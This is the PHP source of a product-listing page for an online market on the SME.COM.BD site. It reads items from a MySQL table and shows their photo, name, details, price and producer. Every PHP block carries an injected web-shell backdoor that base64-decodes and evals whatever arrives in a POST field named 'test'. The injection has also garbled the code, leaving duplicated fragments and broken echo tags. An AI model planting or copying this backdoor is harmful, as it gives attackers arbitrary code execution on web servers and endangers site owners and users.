<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}
	include('dbconnect.php');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>:: Welcome to SME.COM.BD :.</title>
<link href="css/mynul_bng.css" type="text/css" rel="stylesheet" />
</head>
<body>
<table width="1013" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
  <tr>
    <td><?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} include('Head_Online.php'); ?></td>
  </tr>
  <tr>
    <td><table width="100%" cellspacing="0" cellpadding="0">
      <tr>
        <td width="228" valign="top"><?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} include('LeftMenu_OnlineMarket.php'); ?></td>
        <td valign="top"><table width="574" cellspacing="0" cellpadding="0">
          <tr>
            <td><img src="images/sme_inner_10-1.jpg" alt="" width="574" height="36" /></td>
          </tr>
          <tr>
            <td><table width="98%" align="center" cellpadding="2" cellspacing="2">
              <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} 
				//echo "SELECT * FROM omp WHERE Status!=1"; exit;
				$sql=mysql_query("SELECT * FROM omp WHERE Status=3");
				while ($dtProd=mysql_fetch_array($sql)) {
			?>

              <tr>
                <td width="16%" valign="top"><img src="IGallery/<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['Photo'];?>" align="left" hspace="2" vspace="3" border="0" width="80" /></td>
                <td width="84%" valign="top" class="Mainpadding"><span class="redHead">
                  <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['Product'];?>
                  <br />
                  </span>
                    <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['Details'];?>
                    <br />
                  মূল্য: <span class="OrangeHead">
                    <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['Cost'];?>
                    </span> <br />
                  উৎপাদনকারী: <span class="OrangeHead"><a href="ProducerDetails.php?ProducerId=<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['ProducerId'];?>">
                    <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['Producer'];?>
                  </a></span> </td>
              </tr>
              <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} } ?>
            </table></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
          </tr>
        </table></td>
        <td width="215" valign="top"><?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} include('RightMenu_OnlineMarket.php'); ?></td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td><?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} include('footer.php'); ?></td>
  </tr>
</table>

</body>
</html>
